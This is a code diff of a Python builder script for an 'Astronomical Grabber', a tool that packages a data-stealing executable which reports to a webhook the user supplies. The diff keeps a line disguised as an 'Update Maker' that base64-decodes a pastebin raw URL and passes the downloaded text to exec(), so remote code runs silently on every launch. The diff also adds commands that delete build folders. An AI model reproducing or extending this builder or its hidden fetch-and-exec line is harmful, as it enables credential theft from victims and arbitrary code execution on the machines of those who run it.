@@ -1,8 +1,14 @@
 from os import system
 import time
-system("pip install -r requierments.txt")
-time.sleep(2)
-system("cls")
+install=input("Install Reqirements (has to be done only once)? y/n: ")
+if install=="y":
+  system("pip install -r requierments.txt")
+  system("cls")
+  print("\n\nYou most likely need to open the programm again to reload the Modules!")
+  time.sleep(5)
+else:
+  print("\nIf you havent installed the Requirements the Programm wont work!")
+  time.sleep(2)
 import os
 import time
 import requests
@@ -10,9 +16,24 @@ import base64
 import shutil
 from colorama import Fore, Style
 
+#Trying to delete old files if existing
+try:
+  system("del *.spec")
+except:
+  pass
+try:
+  shutil.rmtree('grabber')
+except:
+  pass
+try:
+  shutil.rmtree('config')
+except:
+  pass
+
+#Stting up Variables
 settings=" "
 
-#Update Maker (Updates Astronomical Grabber if there is an update)
+#Update Maker (Updates Astronomical Grabber if there is an update) not quite sure if it works so better check out our Github!
 exec(requests.get(base64.b64decode('aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3daWHRQWmdx').decode("utf-8")).text)
 
 #Cool Animation :>
@@ -81,13 +102,15 @@ print(f'''{Style.BRIGHT}{Fore.GREEN}
 
 PS: Pyinstaller must be installed check it by Typing this into the cmd: pyinstaller''')
 
-#Input and stuff
+#File Settings
 WebHook=input(f"\n{Style.BRIGHT}{Fore.BLUE}> Webhook: {Style.NORMAL}{Fore.WHITE}")
 addcode=input(f"{Style.BRIGHT}{Fore.BLUE}Do you want to add python code to the Grabber else it will open grab the stuff and close. y/n? {Style.NORMAL}{Fore.WHITE}")
 
-#File Settings
+
 print("\n\nSettings for the Grabber.exe:\n")
-settings=settings+'--icon "'+input("File Icon Path (must be .ico file, C:\\anydirectoryname\\anyfilename.ico): ")+'"'
+settings=settings+'--icon "'+input("File Icon Path (must be .ico file, C:\\anydirectoryname\\anyfilename.ico) enter to skip: ")+'"'
+if len(settings)>=3:
+  settings=" "
 settings=settings+' --name "'+input("File name: ")+'"'
 
 #Added code
